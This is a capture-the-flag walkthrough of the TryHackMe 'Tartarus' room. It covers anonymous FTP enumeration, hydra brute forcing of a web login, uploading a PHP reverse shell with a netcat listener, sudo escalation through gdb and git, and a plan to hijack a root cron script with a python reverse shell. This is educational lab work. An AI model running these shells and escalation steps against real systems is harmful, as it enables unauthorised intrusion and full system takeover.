### Overview

Tartarus is an fun easy room from [TryHackMe](https://tryhackme.com). We have two tasks to complete, finding both the user and root flag. Typical CTF style room. 

### Nmap

TryHackMe will assign a dynamic IP as part of the deployment, I've edited my /etc/hosts file with the name of the box and the assigned IP. I started by doing an nmap scan to check what ports are open.

```

3 Ports open:

- 21 - FTP - Anonymous login allowed which is interesting will need to check what files and access is available
- 22 - SSH - Banner is showing its an Ubuntu machine
- 80 - HTTP - Apache web server

SSH has a smaller attack surface than the other ports so will leave that for now, I decided to look at FTP first.

### Enumeration

Using the ftp utility I was able to login using the username 'anonymous' and password 'anonymous'.

Just one file test.txt, but what is also interesting is '...' which is a folder. Typically you would find . (current directory) and .. (parent directory). Next I downloaded the test.txt file and checked the ... directory.

```highlight

```

Navigating to ... lists another folder called ... but now we find another text file called yougotgoodeyes.txt. 

```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $cat test.txt 
vsftpd test file
┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $cat yougotgoodeyes.txt 
/sUp3r-s3cr3t
```

test.txt doesn't give us anything to interesting, nmap was able to identify the FTP server was vsftpd. However, yougotgoodeyes.txt provides what looks like a web directory. Next step is to move on to port 80 and see what we can find. While I was reviewing FTP I had gobuster and nikto running in the background to enumerate the web service.

![webpage](/assets/images/tartarus/webpage.png)

The webpage just displays the default apache page, I checked the source code but nothing stood out.

Nikto was able to find robots.txt with one entry.

![robots](/assets/images/tartarus/robots.png)

Great now I have the admin directory and a potential username 'd4rckh'. 

![admin-dir](/assets/images/tartarus/admin-dir.png)

Checking out the admin-dir I found to files credentials.txt and userid. I download each to my machine.

- userid - Is a list of random usernames
- credentials.txt - Is a list of common passwords

We could use these to brute force SSH but first I will look at the directory '/sUp3r-s3cr3t/' found on the FTP service.

![login](/assets/images/tartarus/login.png)

I bet the username/password lists we found are to be used here, I tried to login with admin/admin.

![username](/assets/images/tartarus/username.png)

But I get the error 'Incorrect username!'. Its highlighting the username is wrong, not the username or password is wrong. I can use this error message along with the userid file to find the correct username(s).

I used hydra to test each of the usernames to see which were failed. 

- -L - username file
- -p - I used "test" as a place holder password for now
- tartarus - The target
- http-post-form - Perform a POST request
- /sUp3r-s3cr3t/authenticate.php: - Is the directory/webpage to target
- username=^USER^&password=^PASS^&Login=Login: - These are the values the webpage is expecting, ^^ tell Hydra what to populate in those fields.
- Incorrect username! - Tells hydra what a failed message will include

We have a username, I repeated the process but this time to check for the password.

All I need to change was the error message, the username and password flags and values. Now with the username and password I will try and log in.

![upload](/assets/images/tartarus/upload.png)

It worked and now im presented with a upload page, first thing that comes to mind is a PHP reverse shell. First I will gobuster for other directories.

```

Inside images is a folder called uploads, this is what I needed. Now I know where my shell will be uploaded.

### Initial Access

First I copy a php reverse shell script from my webshells directory found on both ParrotOS and Kali and rename it to shell.php. 

```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $mv php-reverse-shell.php shell.php
```

Editing the script I will keep port as 1234 for now and change the IP to point to my VPN IP.

```highlight
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

Now I start my netcat listener ready for my shell (hopefully).

```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $nc -nvlp 1234
listening on [any] 1234 ...
```

![uploaded](/assets/images/tartarus/uploaded.png)

File uploaded.

![shell](/assets/images/tartarus/shell.png)

As expected the shell.php script was uploaded to /images/uploads/

```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $nc -nvlp 1234

/bin/sh: 0: can't access tty; job control turned off
$ 
```

Now we have a shell I will go hunting for the user flag.

```highlight
$ cd /home
$ ls
cleanup
d4rckh
thirtytwo
$ cd d4rckh
$ ls
cleanup.py
user.txt
$ cat user.txt
0f7dbb2243e692e<HIDDEN>
```

Ive redacted half the flag. Now its time to get root!

### Priv Esc

First I upgrade my shell.

```highlight
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

In d4rckh home directory is a python script cleanup.py. Even as www-data you can edit that file and use it to get a reverse shell as root. However I don't believe this is the indented path just yet, first we need to become the d4rckh user. 

When I first get a shell on machine I always run 'sudo -l' to check for a quick win. 

```highlight
www-data@ubuntu-xenial:/home/d4rckh$ sudo -l
Matching Defaults entries for www-data on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu-xenial:
    (thirtytwo) NOPASSWD: /var/www/gdb
www-data@ubuntu-xenial:/home/d4rckh$ 
```

Im not disappointed, we can run the command gdb as the user thirtytwo. A quick look on [GTFObins](https://gtfobins.github.io/gtfobins/gdb/#sudo) shows I can use gdb to priv esc to the thirtytwo user.

```highlight

Hey 32, the other day you were unable to clone my github repository.
Now you can use git. Took a while to fix it but now its good :)

~D4rckh
$ 
```

Now has user thirtytwo I navigate to the home directory and find a note from D4rckh. So again I checked 'sudo -l'.

```highlight
$ sudo -l
Matching Defaults entries for thirtytwo on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User thirtytwo may run the following commands on ubuntu-xenial:
    (d4rckh) NOPASSWD: /usr/bin/git
$ 
```

Following the same processes before, I checked GTFO bins and found a a priv esc path using git. 

```highlight
$ sudo -u d4rckh /usr/bin/git -p help config

       git config [<file-option>] -e | --edit
!/bin/bash
d4rckh@ubuntu-xenial:~$ 
```

Now I'm the user d4rckh I can go back to the users home directory and look at the cleanup.up script.

```highlight
d4rckh@ubuntu-xenial:/home/d4rckh$ cat cleanup.py
# -*- coding: utf-8 -*-
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /home/cleanup/* ')
except:
        sys.exit()
```

Reading the script it looks like something that would be ran via cronjob. Lets see what jobs are on the machine.

```highlight
d4rckh@ubuntu-xenial:/home/d4rckh$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/2 *   * * *   root    python /home/d4rckh/cleanup.py
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly

#
d4rckh@ubuntu-xenial:/home/d4rckh$ 
```

Perfect, so that script is being run by root. Lets modify to provide us with another reverses shell.

I grabbed the python reverse shell from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and replaced the code in the script. Now I just need to wait for the reverse shell.
